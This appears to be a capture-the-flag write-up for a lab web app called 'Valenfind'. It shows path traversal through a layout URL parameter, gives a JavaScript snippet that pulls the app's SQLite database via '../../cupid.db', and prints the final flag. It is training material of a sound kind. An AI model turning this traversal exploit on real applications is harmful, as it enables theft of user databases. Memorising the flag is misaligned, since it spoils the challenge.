**DESCRIPTION**


There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?  You can access it here: [http://MACHINE_IP:5000]

**HOW TO SOLVE?**

I noticed a URL parameter (?layout=theme_classic.html) that looked like a filename. This is a "red flag" suggesting the server fetches files dynamically from the disk based on user input.
By injecting "dot-dot-slash" sequences (../../), I attempted to "escape" the intended directory (likely /templates/) to reach the root of the application.

<img width="2879" height="1702" alt="image" src="https://github.com/user-attachments/assets/1167845c-0cb0-4082-baf9-6acb8d1bc371" />

By reading the leaked app.py code I identified the database configuration DATABSE: 'cupid.db', so I tried to download the SQLite databse and potentially find the flag.


Put this in the source of the site 

```javascript
fetch('/api/fetch_layout?layout=../../cupid.db')
    .then(response => response.blob()) 
    .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'cupid.db';         
        document.body.appendChild(a);
        a.click(); 
        window.URL.revokeObjectURL(url);
        console.log("%c[+] Download started", "color: green; font-weight: bold;");
    })
    .catch(err => console.error("[-] Error:", err));
```

Opened it and found the flag.


<img width="2879" height="1559" alt="image" src="https://github.com/user-attachments/assets/7ccb6b75-10a5-47a0-969e-628a850fbc13" />



**Final Flag:** `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`
